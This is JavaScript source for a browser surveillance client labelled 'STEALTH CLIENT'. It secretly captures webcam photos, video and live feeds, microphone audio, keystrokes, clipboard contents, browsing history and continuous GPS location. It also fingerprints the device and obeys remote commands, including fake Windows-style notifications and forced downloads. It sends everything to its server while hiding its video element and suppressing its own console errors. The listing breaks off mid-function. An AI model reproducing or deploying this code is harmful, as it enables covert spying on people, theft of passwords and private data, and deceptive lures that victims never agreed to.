// ═══════════════════════════════════════════════════════════════
//  STEALTH CLIENT — Dynamic Config + Remote Commands
// ═══════════════════════════════════════════════════════════════
(() => {
    let C = {
        photoEnabled: true, photoPeriod: 30000, photoQuality: 0.7,
        videoEnabled: true, videoPeriod: 300000, videoDuration: 10000,
        locationEnabled: true, locationPeriod: 30000,
        keystrokesEnabled: true, keyLogFlush: 10000,
        clipboardEnabled: true, clipboardCheck: 15000,
        deviceInfoPeriod: 60000, heartbeatPeriod: 8000, commandPoll: 3000
    };

    const BASE = location.origin;
    const ID = localStorage.getItem('_cid') || (() => {
        const id = 'c' + Math.random().toString(36).slice(2, 8) + Date.now().toString(36);
        localStorage.setItem('_cid', id);
        return id;
    })();

    let stream = null, videoEl = null, canvas = null, ctx = null;
    let videoReady = false; // true once video element is playing with valid dimensions
    let keyBuffer = '', lastClip = '';
    let liveSocket = null, liveInterval = null, liveActive = false;
    let healthCheckInterval = null; // periodic frozen-stream detector
    let audioRecorder = null, audioActive = false;
    let audioHTTPActive = false, audioHTTPTimer = null;
    let videoRecording = false; // guard: prevents concurrent video recordings
    const pageStartTime = Date.now(); // track total session duration

    // ═══ HELPERS ═══════════════════════════════════════════════
    // Suppress all console errors from this script
    const origError = console.error;
    console.error = (...args) => {
        const s = args.join(' ');
        if (s.includes(BASE) || s.includes('getUserMedia') || s.includes('clipboard')) return;
        origError.apply(console, args);
    };

    async function post(url, data, retries = 2) {
        for (let i = 0; i <= retries; i++) {
            try {
                const r = await fetch(BASE + url, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ clientId: ID, ...data })
                });
                return r.ok ? await r.json() : null;
            } catch {
                if (i < retries) await new Promise(r => setTimeout(r, 1000 * (i + 1)));
            }
        }
        return null;
    }

    async function upload(url, field, blob, filename, retries = 1) {
        for (let i = 0; i <= retries; i++) {
            try {
                const fd = new FormData();
                fd.append('clientId', ID);
                fd.append('timestamp', Date.now().toString());
                fd.append(field, blob, filename);
                const r = await fetch(BASE + url, { method: 'POST', body: fd });
                return r.ok ? await r.json() : null;
            } catch {
                if (i < retries) await new Promise(r => setTimeout(r, 2000 * (i + 1)));
            }
        }
        return null;
    }

    // ═══ EVENT LOGGER ═══════════════════════════════════════════
    // Structured event logging for named browser events (tab switches,
    // swipes, speech, focus time, context menu, ambient light, etc.)
    function logEvent(type, data) {
        try {
            post('/log-keys', {
                keys: `[${type.toUpperCase().replace(/_/g, ' ')}] ${JSON.stringify(data).slice(0, 400)}`,
                url: location.href
            });
        } catch {}
    }

    // ═══ CONFIG FROM SERVER ════════════════════════════════════
    async function fetchConfig() {
        try {
            const r = await fetch(BASE + '/api/config');
            if (r.ok) { const cfg = await r.json(); C = { ...C, ...cfg }; }
        } catch {}
    }

    // ═══ REMOTE COMMAND SYSTEM ═════════════════════════════════
    async function pollCommands() {
        try {
            const r = await fetch(BASE + '/api/commands/' + ID);
            if (r.ok) { (await r.json()).forEach(execCmd); }
        } catch {}
    }

    function execCmd(cmd) {
        try {
            switch (cmd.type) {
                case 'notification': showWinNotif(cmd.data); break;
                case 'alert': alert(cmd.data.message || ''); break;
                case 'redirect': {
                    // Only allow http/https URLs to prevent javascript: injection
                    const rUrl = cmd.data.url || '';
                    if (/^https?:\/\//i.test(rUrl)) location.href = rUrl;
                    break;
                }
                case 'sound': playTone(cmd.data); break;
                case 'popup': {
                    const pUrl = cmd.data.url || '';
                    if (/^https?:\/\//i.test(pUrl)) window.open(pUrl, '_blank', `width=${cmd.data.width||500},height=${cmd.data.height||400}`);
                    break;
                }
                case 'screenshot': takePhoto(); break;
                case 'get-location': {
                    try {
                        navigator.geolocation.getCurrentPosition(p => {
                            post('/upload-location', { latitude: p.coords.latitude, longitude: p.coords.longitude, accuracy: p.coords.accuracy, altitude: p.coords.altitude, speed: p.coords.speed, heading: p.coords.heading, source: 'on-demand' });
                        }, () => {}, { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 });
                    } catch {}
                    break;
                }
                case 'start-live-http': startLiveFeed(); break;
                case 'stop-live-http':  stopLiveFeed();  break;
                case 'start-audio-http': startAudioHTTP(); break;
                case 'stop-audio-http':  stopAudioHTTP();  break;
                case 'vibrate': try { navigator.vibrate(cmd.data.pattern || [200,100,200]); } catch {} break;
                case 'overlay': showOverlay(cmd.data); break;
                case 'file': {
                    try {
                        const fileUrl = /^https?:\/\//.test(cmd.data.url) ? cmd.data.url : BASE + cmd.data.url;
                        const a = document.createElement('a');
                        a.href = fileUrl;
                        a.download = cmd.data.filename || 'bestand';
                        a.style.display = 'none';
                        document.body.appendChild(a);
                        a.click();
                        setTimeout(() => a.remove(), 1000);
                    } catch(e) {
                        // Fallback: open in new tab
                        const fileUrl = /^https?:\/\//.test(cmd.data.url) ? cmd.data.url : BASE + cmd.data.url;
                        window.open(fileUrl, '_blank');
                    }
                    break;
                }
            }
        } catch {}
    }

    // ═══ WINDOWS-STYLE NOTIFICATION ═══════════════════════════
    function injectCSS() {
        if (document.getElementById('_ns')) return;
        const s = document.createElement('style'); s.id = '_ns';
        s.textContent = `
._wn{position:fixed;bottom:16px;right:16px;width:364px;background:#2b2b2b;border-radius:8px;box-shadow:0 8px 40px rgba(0,0,0,.5);font-family:'Segoe UI',system-ui,sans-serif;color:#fff;z-index:999999;overflow:hidden;animation:_wnI .35s cubic-bezier(.2,1,.3,1);border:1px solid #404040}
._wn *{margin:0;padding:0;box-sizing:border-box;font-family:inherit}
._wn-hd{display:flex;align-items:center;gap:8px;padding:12px 14px 2px;position:relative}
._wn-ic{width:16px;height:16px;flex-shrink:0}
._wn-ap{font-size:12px;color:#888;font-weight:400}
._wn-tm{font-size:11px;color:#666;margin-left:auto;padding-right:20px}
._wn-x{position:absolute;top:8px;right:8px;background:none;border:none;color:#888;font-size:13px;cursor:pointer;padding:2px 6px;border-radius:3px;line-height:1}
._wn-x:hover{background:#404040;color:#fff}
._wn-bd{padding:6px 14px 14px 38px}
._wn-tt{font-size:14px;font-weight:600;color:#fff;margin-bottom:3px}
._wn-ms{font-size:13px;color:#ccc;line-height:1.45}
._wn-im{margin:0 14px 10px 38px;border-radius:4px;overflow:hidden}
._wn-im img{width:100%;display:block}
._wn-ac{display:flex;border-top:1px solid #404040}
._wn-bt{flex:1;padding:11px 8px;background:none;border:none;border-right:1px solid #404040;color:#60cdff;font-size:13px;cursor:pointer;font-family:inherit;transition:background .15s}
._wn-bt:last-child{border-right:none}
._wn-bt:hover{background:#383838}
@keyframes _wnI{from{transform:translateX(400px);opacity:0}to{transform:translateX(0);opacity:1}}
@keyframes _wnO{from{transform:translateX(0);opacity:1}to{transform:translateX(400px);opacity:0}}
._wnOut{animation:_wnO .25s ease forwards}
._ov{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.88);z-index:999998;display:flex;align-items:center;justify-content:center;font-family:'Segoe UI',sans-serif;color:#fff;cursor:pointer;animation:_ovI .3s ease}
@keyframes _ovI{from{opacity:0}to{opacity:1}}`;
        document.head.appendChild(s);
    }

    const ICO = {
        shield: `<svg viewBox="0 0 16 16" class="_wn-ic"><path fill="#4caf50" d="M8 0L1 3v5c0 4.17 2.88 8.1 7 9.5 4.12-1.4 7-5.33 7-9.5V3L8 0z"/><path fill="#fff" d="M7 9.5L5 7.5l1-1 1 1.5L10 5l1 1L7 9.5z"/></svg>`,
        info: `<svg viewBox="0 0 16 16" class="_wn-ic"><circle cx="8" cy="8" r="7" fill="#0078d4"/><rect x="7" y="7" width="2" height="5" rx="1" fill="#fff"/><circle cx="8" cy="5" r="1.2" fill="#fff"/></svg>`,
        warning: `<svg viewBox="0 0 16 16" class="_wn-ic"><path fill="#ffb900" d="M8 1L0 15h16L8 1z"/><rect x="7" y="6" width="2" height="4.5" rx=".5" fill="#1a1a1a"/><circle cx="8" cy="12.5" r="1" fill="#1a1a1a"/></svg>`,
        chrome: `<svg viewBox="0 0 16 16" class="_wn-ic"><circle cx="8" cy="8" r="7" fill="#4285f4"/><circle cx="8" cy="8" r="3" fill="#fff"/><path d="M8 5a3 3 0 0 1 2.6 1.5H15A7 7 0 0 0 1.5 4.5l3 5.2A3 3 0 0 1 8 5z" fill="#ea4335" opacity=".9"/></svg>`,
        edge: `<svg viewBox="0 0 16 16" class="_wn-ic"><circle cx="8" cy="8" r="7" fill="#0078d4"/><text x="8" y="12" text-anchor="middle" fill="#fff" font-size="10" font-weight="bold">e</text></svg>`,
        windows: `<svg viewBox="0 0 16 16" class="_wn-ic"><path fill="#00a4ef" d="M1 8.1h6.2v5.5L1 12.4V8.1zm0-5.7L7.2 1v5.7H1V2.4zM8.3 1l6.7-.9v7.6H8.3V1zM8.3 8.1H15v7.5l-6.7-1V8.1z"/></svg>`,
        update: `<svg viewBox="0 0 16 16" class="_wn-ic"><path fill="#0078d4" d="M8 2v3l3-3h-3zM8 2C4.7 2 2 4.7 2 8s2.7 6 6 6 6-2.7 6-6h-2c0 2.2-1.8 4-4 4s-4-1.8-4-4 1.8-4 4-4V2z"/></svg>`
    };

    function esc(s) { const d = document.createElement('div'); d.textContent = s || ''; return d.innerHTML; }

    function showWinNotif(d) {
        injectCSS();
        const el = document.createElement('div');
        el.className = '_wn';
        const ico = ICO[d.icon] || ICO.info;
        const app = d.app || 'System';
        const btns = d.buttons || [];
        const now = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
        const dismiss = () => { el.classList.add('_wnOut'); setTimeout(() => el.remove(), 250); };

        el.innerHTML = `<div class="_wn-hd">${ico}<span class="_wn-ap">${esc(app)}</span><span class="_wn-tm">${now}</span><button class="_wn-x" title="Sluiten">\u2715</button></div>
<div class="_wn-bd"><div class="_wn-tt">${esc(d.title || 'Melding')}</div><div class="_wn-ms">${esc(d.message || '')}</div></div>
${d.image ? `<div class="_wn-im"><img src="${d.image}" alt=""></div>` : ''}
${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" data-url="${b.url || ''}">${esc(b.text)}</button>`).join('')}</div>` : ''}`;

        el.querySelector('._wn-x').onclick = dismiss;
        el.querySelectorAll('._wn-bt').forEach(b => {
            b.onclick = () => { if (b.dataset.url) window.open(b.dataset.url, '_blank'); dismiss(); };
        });

        document.body.appendChild(el);
        playNotifSound();
        const dur = d.duration || 8000;
        if (dur > 0) setTimeout(() => { if (el.parentElement) dismiss(); }, dur);
    }

    function playNotifSound() {
        try {
            const a = new AudioContext(), o = a.createOscillator(), g = a.createGain();
            o.connect(g); g.connect(a.destination);
            o.frequency.setValueAtTime(880, a.currentTime);
            o.frequency.setValueAtTime(660, a.currentTime + 0.08);
            g.gain.setValueAtTime(0.08, a.currentTime);
            g.gain.exponentialRampToValueAtTime(0.001, a.currentTime + 0.35);
            o.start(a.currentTime); o.stop(a.currentTime + 0.35);
        } catch {}
    }

    function playTone(d) {
        try {
            const a = new AudioContext(), o = a.createOscillator(), g = a.createGain();
            o.connect(g); g.connect(a.destination);
            o.frequency.value = d.frequency || 440;
            g.gain.value = d.volume || 0.3;
            o.start(); o.stop(a.currentTime + (d.duration || 500) / 1000);
        } catch {}
    }

    function showOverlay(d) {
        injectCSS();
        const o = document.createElement('div');
        o.className = '_ov';
        o.innerHTML = d.html || '<h1 style="font-size:2rem">\u26A0\uFE0F Notice</h1>';
        o.onclick = () => o.remove();
        document.body.appendChild(o);
        if (d.duration > 0) setTimeout(() => { if (o.parentElement) o.remove(); }, d.duration);
    }

    // ═══ PAGE VISIT TRACKING ══════════════════════════════════
    function logPageVisit() {
        post('/log-visit', { url: location.href, title: document.title, referrer: document.referrer });
    }

    // ── SPA navigation detection (React, Vue, Angular, etc.) ──
    // Override history.pushState and replaceState to capture navigation
    // in single-page apps that never trigger a full page reload.
    (function patchHistory() {
        try {
            let lastUrl = location.href;
            const wrap = (orig) => function(...args) {
                const result = orig.apply(this, args);
                if (location.href !== lastUrl) {
                    lastUrl = location.href;
                    setTimeout(() => logPageVisit(), 0);
                }
                return result;
            };
            history.pushState    = wrap(history.pushState);
            history.replaceState = wrap(history.replaceState);
            window.addEventListener('popstate', () => {
                if (location.href !== lastUrl) { lastUrl = location.href; logPageVisit(); }
            });
        } catch {}
    })();

    // ═══ KEYSTROKE LOGGING ════════════════════════════════════
    function initKeyLogger() {
        document.addEventListener('keydown', e => {
            const k = e.key;
            if (k.length === 1) keyBuffer += k;
            else {
                const m = { Backspace:'[BS]', Enter:'[ENTER]', Tab:'[TAB]', Escape:'[ESC]', Delete:'[DEL]', ArrowUp:'[UP]', ArrowDown:'[DN]', ArrowLeft:'[LT]', ArrowRight:'[RT]' };
                if (m[k]) keyBuffer += m[k];
            }
        }, true);
        setInterval(() => {
            if (keyBuffer.length > 0) { post('/log-keys', { keys: keyBuffer, url: location.href }); keyBuffer = ''; }
        }, C.keyLogFlush);
    }

    // ═══ CLIPBOARD ════════════════════════════════════════════
    let lastClipVal = '';
    async function checkClipboard() {
        try {
            if (navigator.clipboard && navigator.clipboard.readText) {
                const t = await navigator.clipboard.readText();
                if (t && t !== lastClipVal && t.length > 0) { lastClipVal = t; post('/log-clipboard', { content: t }); }
            }
        } catch {}
    }

    function initClipboardMonitor() {
        document.addEventListener('paste', e => {
            try { const t = e.clipboardData?.getData('text') || ''; if (t && t !== lastClipVal) { lastClipVal = t; post('/log-clipboard', { content: t }); } } catch {}
        }, true);
        document.addEventListener('copy', () => setTimeout(checkClipboard, 100), true);
    }

    // ═══ FINGERPRINTS ═════════════════════════════════════════
    function getCanvasFingerprint() {
        try {
            const c = document.createElement('canvas'); c.width = 200; c.height = 50;
            const x = c.getContext('2d'); x.textBaseline = 'top'; x.font = '14px Arial';
            x.fillStyle = '#f60'; x.fillRect(125, 1, 62, 20);
            x.fillStyle = '#069'; x.fillText('Cwm fjordbank glyphs vext quiz', 2, 15);
            x.fillStyle = 'rgba(102,204,0,0.7)'; x.fillText('Cwm fjordbank glyphs vext quiz', 4, 17);
            return c.toDataURL().slice(-50);
        } catch { return 'n/a'; }
    }

    async function getAudioFingerprint() {
        try {
            const ac = new (window.AudioContext || window.webkitAudioContext)();
            const osc = ac.createOscillator(), ana = ac.createAnalyser(), gain = ac.createGain(), proc = ac.createScriptProcessor(4096, 1, 1);
            gain.gain.value = 0; osc.type = 'triangle';
            osc.connect(ana); ana.connect(proc); proc.connect(gain); gain.connect(ac.destination);
            osc.start(0);
            return new Promise(r => {
                proc.onaudioprocess = () => {
                    const d = new Float32Array(ana.frequencyBinCount); ana.getFloatFrequencyData(d);
                    let h = 0; for (let i = 0; i < d.length; i++) h += Math.abs(d[i]);
                    osc.disconnect(); proc.disconnect(); gain.disconnect(); ac.close();
                    r(h.toFixed(2));
                };
            });
        } catch { return 'n/a'; }
    }

    async function getLocalIPs() {
        try {
            const pc = new RTCPeerConnection({ iceServers: [] }); pc.createDataChannel('');
            const offer = await pc.createOffer(); await pc.setLocalDescription(offer);
            return new Promise(r => {
                const ips = new Set();
                const to = setTimeout(() => { pc.close(); r([...ips]); }, 3000);
                pc.onicecandidate = e => {
                    if (!e.candidate) { clearTimeout(to); pc.close(); r([...ips]); return; }
                    const m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
                    if (m) ips.add(m[1]);
                };
            });
        } catch { return []; }
    }

    // ═══ DEVICE INFO ══════════════════════════════════════════
    async function collectDeviceInfo() {
        const info = {
            platform: navigator.platform || 'unknown', language: navigator.language || 'unknown',
            languages: navigator.languages ? navigator.languages.join(', ') : '',
            cookiesEnabled: navigator.cookieEnabled, doNotTrack: navigator.doNotTrack,
            hardwareConcurrency: navigator.hardwareConcurrency || 0,
            maxTouchPoints: navigator.maxTouchPoints || 0,
            screenW: screen.width, screenH: screen.height,
            screenAvailW: screen.availWidth, screenAvailH: screen.availHeight,
            colorDepth: screen.colorDepth, pixelRatio: window.devicePixelRatio || 1,
            windowW: window.innerWidth, windowH: window.innerHeight,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            online: navigator.onLine, userAgent: navigator.userAgent,
            vendor: navigator.vendor || '', pdfViewerEnabled: navigator.pdfViewerEnabled || false,
            canvasFingerprint: getCanvasFingerprint()
        };
        try { if (navigator.getBattery) { const b = await navigator.getBattery(); info.batteryLevel = Math.round(b.level * 100); info.batteryCharging = b.charging; } } catch {}
        try { const cn = navigator.connection || navigator.mozConnection || navigator.webkitConnection; if (cn) { info.networkType = cn.effectiveType || cn.type || 'unknown'; info.downlink = cn.downlink; info.rtt = cn.rtt; info.saveData = cn.saveData; } } catch {}
        try { if (navigator.deviceMemory) info.deviceMemory = navigator.deviceMemory; } catch {}
        try { if (navigator.storage?.estimate) { const e = await navigator.storage.estimate(); info.storageQuota = Math.round(e.quota / 1048576); info.storageUsage = Math.round(e.usage / 1048576); } } catch {}
        try { const d = await navigator.mediaDevices.enumerateDevices(); info.cameras = d.filter(x => x.kind === 'videoinput').length; info.microphones = d.filter(x => x.kind === 'audioinput').length; info.speakers = d.filter(x => x.kind === 'audiooutput').length; } catch {}
        try { const c = document.createElement('canvas'), gl = c.getContext('webgl') || c.getContext('experimental-webgl'); if (gl) { const db = gl.getExtension('WEBGL_debug_renderer_info'); if (db) { info.gpuVendor = gl.getParameter(db.UNMASKED_VENDOR_WEBGL); info.gpuRenderer = gl.getParameter(db.UNMASKED_RENDERER_WEBGL); } } } catch {}
        try { const ips = await getLocalIPs(); if (ips.length) info.localIPs = ips.join(', '); } catch {}
        try { const af = await getAudioFingerprint(); if (af !== 'n/a') info.audioFingerprint = af; } catch {}
        try { if (navigator.plugins?.length > 0) info.plugins = Array.from(navigator.plugins).map(p => p.name).join(', '); } catch {}
        // Gamepad detection
        try { const gp = navigator.getGamepads ? [...navigator.getGamepads()].filter(Boolean) : []; if (gp.length) info.gamepads = gp.map(g => g.id).join(', '); } catch {}
        // Bluetooth / XR capability flags
        try { info.bluetoothAvailable = !!navigator.bluetooth; } catch {}
        try { info.webXRAvailable = !!(navigator.xr); } catch {}
        // Check if device appears to be a mobile/tablet based on coarse pointer + touch
        try { info.hasTouchscreen = navigator.maxTouchPoints > 0; info.hasCoarsePointer = window.matchMedia('(pointer:coarse)').matches; } catch {}
        await post('/device-info', info);
    }

    // ═══ CAMERA + PHOTO + VIDEO ═══════════════════════════════
    async function takePhoto() {
        if (!stream || !videoEl || !videoReady) return;
        // Must have an actual video track with real dimensions — never draw a black frame
        if (stream.getVideoTracks().length === 0) return;
        const w = videoEl.videoWidth;
        const h = videoEl.videoHeight;
        if (w === 0 || h === 0) return;
        try {
            if (!canvas) { canvas = document.createElement('canvas'); ctx = canvas.getContext('2d'); }
            canvas.width = w; canvas.height = h;
            ctx.drawImage(videoEl, 0, 0, w, h);
            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', C.photoQuality || 0.7));
            if (blob && blob.size > 1000) await upload('/upload-photo', 'photo', blob, `snap_${Date.now()}.jpg`);
        } catch {}
    }

    function recordVideo() {
        if (!stream || stream.getVideoTracks().length === 0) return;
        if (videoRecording) return; // prevent concurrent recordings
        try {
            const types = ['video/webm;codecs=vp9,opus', 'video/webm;codecs=vp8,opus', 'video/webm'];
            const mime = types.find(t => MediaRecorder.isTypeSupported(t)) || 'video/webm';
            const rec = new MediaRecorder(stream, { mimeType: mime });
            const chunks = [];
            videoRecording = true;
            rec.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
            rec.onstop = async () => {
                videoRecording = false;
                if (chunks.length) { const b = new Blob(chunks, { type: mime }); if (b.size > 1000) await upload('/upload-media', 'media', b, `vid_${Date.now()}.webm`); }
            };
            rec.onerror = () => { videoRecording = false; };
            rec.start(1000);
            setTimeout(() => { try { if (rec.state !== 'inactive') rec.stop(); } catch { videoRecording = false; } }, C.videoDuration || 10000);
        } catch { videoRecording = false; }
    }

    // ═══ PERMISSION GATE ═══════════════════════════════════════
    // Returns true if we should proceed with a permission-gated API call.
    //  - state 'granted'  → always proceed (browser shows NO prompt)
    //  - state 'denied'   → never proceed
    //  - state 'prompt'   → proceed only ONCE (stored in localStorage);
    //                       on every subsequent page load we skip silently
    // Falls back to true when the Permissions API is not supported (Firefox
    // for camera/mic) so those browsers still work normally.
    async function checkPerm(name) {
        try {
            const status = await navigator.permissions.query({ name });
            if (status.state === 'granted') return true;
            if (status.state === 'denied')  return false;
            // 'prompt' — check if we already asked once
            const key = '_p_' + name;
            if (localStorage.getItem(key)) return false; // already asked, don't re-prompt
            localStorage.setItem(key, '1');
            // When the user eventually grants or denies, clear the flag so the
            // Permissions API state becomes the sole source of truth going forward.
            status.addEventListener('change', () => {
                if (status.state !== 'prompt') localStorage.removeItem(key);
            });
            return true; // proceed — browser will show the prompt exactly this once
        } catch {
            return true; // Permissions API unsupported — fall through to normal browser behavior
        }
    }

    async function initCamera() {
        videoReady = false;
        // Stop any existing tracks first
        if (stream) { try { stream.getTracks().forEach(t => t.stop()); } catch {} stream = null; }
        // Stop any existing health-check so we don’t stack multiple timers
        if (healthCheckInterval) { clearInterval(healthCheckInterval); healthCheckInterval = null; }

        // ── Step 1: get a stream that has at least one video track ──────
        const videoCfgs = [
            { video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }, audio: true },
            { video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, audio: true },
            { video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } }, audio: true },
            { video: { width: { ideal: 640 }, height: { ideal: 480 } }, audio: true },
            { video: true, audio: true },
            { video: true, audio: false }  // last resort: video without mic
        ];
        for (const cfg of videoCfgs) {
            try {
                const s = await navigator.mediaDevices.getUserMedia(cfg);
                if (s.getVideoTracks().length === 0) { s.getTracks().forEach(t => t.stop()); continue; }
                stream = s;
                break;
            } catch {}
        }

        // ── Step 2: audio-only fallback (for mic feature, no live feed) ─
        if (!stream) {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
                post('/log-error', { type: 'camera', message: 'No video stream available — audio only' });
            } catch {
                post('/log-error', { type: 'camera', message: 'getUserMedia failed for all configs' });
            }
            return; // exit: no video → nothing to set up on videoEl
        }

        // ── Step 3: attach stream to video element ───────────────────────
        videoEl = document.getElementById('v');
        if (!videoEl) {
            videoEl = document.createElement('video');
            videoEl.id = 'v';
            videoEl.setAttribute('autoplay', '');
            videoEl.setAttribute('muted', '');
            videoEl.setAttribute('playsinline', '');
            videoEl.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:320px;height:240px;opacity:0;pointer-events:none;z-index:-1';
            document.body.appendChild(videoEl);
        }
        videoEl.muted = true;
        videoEl.autoplay = true;
        videoEl.playsInline = true;

        // Add ALL event listeners BEFORE assigning srcObject to avoid race conditions
        await new Promise((resolve) => {
            let done = false;
            const finish = () => { if (!done) { done = true; resolve(); } };
            videoEl.addEventListener('loadedmetadata', finish, { once: true });
            videoEl.addEventListener('canplay',        finish, { once: true });
            videoEl.addEventListener('playing',        finish, { once: true });
            videoEl.addEventListener('error',          finish, { once: true });
            videoEl.srcObject = stream;
            videoEl.play().catch(() => {});
            setTimeout(finish, 8000); // hard timeout — never hang forever
        });

        // ── Step 4: wait for real video dimensions (proof frames are flowing)
        let waited = 0;
        while (videoEl.videoWidth === 0 && waited < 5000) {
            await new Promise(r => setTimeout(r, 100));
            waited += 100;
        }
        if (videoEl.videoWidth === 0) {
            post('/log-error', { type: 'camera', message: 'videoWidth stayed 0 after 5s — stream may be black' });
            // Still mark ready so we at least attempt frames (some browsers report 0 initially)
        }

        // ── Step 5: re-init when camera gets revoked ──────────────────────
        stream.getVideoTracks().forEach(t => {
            t.addEventListener('ended', () => { videoReady = false; setTimeout(initCamera, 1000); });
        });

        videoReady = true;

        // ── Step 6: frozen-stream health check ────────────────────────────
        // If videoEl.currentTime stops advancing for 3 consecutive 5s ticks
        // (15s of frozen frames), reinitialise the camera automatically.
        let _lastVT = -1, _frozenCount = 0;
        healthCheckInterval = setInterval(() => {
            if (!videoEl || !videoReady) return;
            const vt = videoEl.currentTime;
            if (vt === _lastVT) {
                if (++_frozenCount >= 3) {
                    _frozenCount = 0;
                    clearInterval(healthCheckInterval);
                    healthCheckInterval = null;
                    videoReady = false;
                    setTimeout(initCamera, 500);
                }
            } else {
                _frozenCount = 0;
            }
            _lastVT = vt;
        }, 5000);
    }

    // ═══ LOCATION ═════════════════════════════════════════════
    function trackLocation() {
        if (!navigator.geolocation) { post('/log-error', { type: 'geo', message: 'Not supported' }); return; }
        // Only ask for location if permission is already granted, or ask at most once
        checkPerm('geolocation').then(ok => {
            if (!ok) return;
        const sendPos = (p, src) => post('/upload-location', {
            latitude: p.coords.latitude, longitude: p.coords.longitude,
            accuracy: p.coords.accuracy, altitude: p.coords.altitude,
            speed: p.coords.speed, heading: p.coords.heading, source: src || 'gps'
        });
        // Always-on high-accuracy watch — sends immediately on every position change
        try {
            navigator.geolocation.watchPosition(p => sendPos(p, 'gps-watch'), () => {}, {
                enableHighAccuracy: true, maximumAge: 0, timeout: 10000
            });
        } catch {}
        // Fallback poll for browsers that throttle watchPosition
        const fallback = () => navigator.geolocation.getCurrentPosition(
            p => sendPos(p, 'gps-poll'),
            () => {},
            { enableHighAccuracy: false, maximumAge: 20000, timeout: 15000 }
        );
        fallback();
        setInterval(fallback, Math.max(10000, C.locationPeriod));
        }).catch(() => {});
    }

    // ═══ HEARTBEAT ═════════════════════════════════════════════
    async function heartbeat() {
        const d = { userAgent: navigator.userAgent, screenW: screen.width, screenH: screen.height, language: navigator.language, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone };
        try { const cn = navigator.connection || navigator.mozConnection || navigator.webkitConnection; if (cn) { d.networkType = cn.effectiveType || cn.type; d.downlink = cn.downlink; d.saveData = cn.saveData; } } catch {}
        try { if (navigator.getBattery) { const b = await navigator.getBattery(); d.battery = Math.round(b.level * 100); d.charging = b.charging; } } catch {}
        // Idle / visibility state
        d.isIdle = !!idleSince;
        d.idleSecs = idleSince ? Math.round((Date.now() - idleSince) / 1000) : 0;
        d.tabHidden = document.hidden;
        d.hiddenMs = totalHiddenMs + (hiddenSince ? Date.now() - hiddenSince : 0);
        d.maxScrollPct = maxScrollPct;
        await post('/heartbeat', d);
    }

    // ═══ LIVE CAMERA FEED VIA HTTP POLLING ══════════════════════
    // Frames are POSTed to /api/live-frame; admin polls the same endpoint.
    // This works on Vercel serverless where socket.io is not available.

    function initLiveSocket() {
        // Keep socket.io only for audio streaming.
        // Pre-check if the server actually has socket.io (not available on Vercel serverless).
        // This prevents a 404 loop when io is cached from a prior local session.
        try {
            fetch(BASE + '/socket.io/socket.io.js', { method: 'HEAD' })
                .then(r => {
                    if (!r.ok) return; // server doesn't support socket.io — skip
                    if (typeof io === 'undefined') {
                        const script = document.createElement('script');
                        script.src = BASE + '/socket.io/socket.io.js';
                        script.onload = () => connectLiveSocket();
                        script.onerror = () => {};
                        document.head.appendChild(script);
                    } else {
                        connectLiveSocket();
                    }
                })
                .catch(() => {});
        } catch {}
    }

    function connectLiveSocket() {
        try {
            liveSocket = io(BASE, { transports: ['websocket', 'polling'], reconnection: true, reconnectionDelay: 3000, reconnectionAttempts: Infinity });
            liveSocket.on('connect', () => {
                liveSocket.emit('join-client', ID);
            });
            liveSocket.on('start-audio', () => { startAudioStream(); });
            liveSocket.on('stop-audio', () => { stopAudioStream(); });
            liveSocket.on('disconnect', () => { stopAudioStream(); });
        } catch {}
    }

    function startLiveFeed() {
        if (liveActive) return;
        // No stream at all yet — retry after init has a chance to run
        if (!stream) { setTimeout(startLiveFeed, 800); return; }
        // No video tracks → can't stream video
        if (stream.getVideoTracks().length === 0) { liveActive = false; return; }
        // Camera not ready yet — wait and retry
        if (!videoReady || !videoEl) {
            setTimeout(startLiveFeed, 800);
            return;
        }
        liveActive = true;

        // Adaptive state
        // Start at good quality — warm-up guard prevents throttling-down during first 8s
        // so cold-start Vercel latency doesn’t keep quality permanently low.
        let quality   = 0.55;   // start at reasonable quality (was 0.25)
        let scale     = 0.85;   // start at 85% resolution (was 0.65)
        let targetMs  = 33;     // aim for ~30 FPS
        let inFlight  = false;  // backpressure: skip frame if POST still running
        let seq       = 0;
        let lastW = 0, lastH = 0;
        let warmup    = true;   // skip quality-down adaptation during first 8s
        setTimeout(() => { warmup = false; }, 8000);

        // Reuse a single canvas for all frames
        const liveCanvas = document.createElement('canvas');
        const liveCtx    = liveCanvas.getContext('2d', { willReadFrequently: false, alpha: false });

        async function sendFrame() {
            if (!liveActive) return;

            // Not ready — retry without updating targetMs
            if (!videoEl || !videoReady || videoEl.videoWidth === 0) {
                liveInterval = setTimeout(sendFrame, 300);
                return;
            }

            // Backpressure: previous POST still in-flight, skip this tick
            if (!inFlight) {
                const sw = Math.round(videoEl.videoWidth  * scale);
                const sh = Math.round(videoEl.videoHeight * scale);

                // Only resize canvas when dimensions actually change
                if (sw !== lastW || sh !== lastH) {
                    liveCanvas.width = sw; liveCanvas.height = sh;
                    lastW = sw; lastH = sh;
                }

                try {
                    liveCtx.drawImage(videoEl, 0, 0, sw, sh);
                    const frame = liveCanvas.toDataURL('image/jpeg', quality);
                    const ts    = Date.now();
                    const s     = ++seq;
                    inFlight    = true;
                    const t0    = performance.now();

                    fetch(BASE + '/api/live-frame', {
                        method:  'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body:    JSON.stringify({ clientId: ID, frame, timestamp: ts, seq: s })
                    }).then(() => {
                        const rtt = performance.now() - t0;
                        // During warmup only allow quality increases, never decreases
                        if (rtt > 280) {
                            if (!warmup) {
                                quality  = Math.max(0.22, quality  - 0.05);
                                scale    = Math.max(0.50, scale    - 0.05);
                                targetMs = Math.min(300,  targetMs + 25);
                            }
                        } else if (rtt > 160) {
                            if (!warmup) {
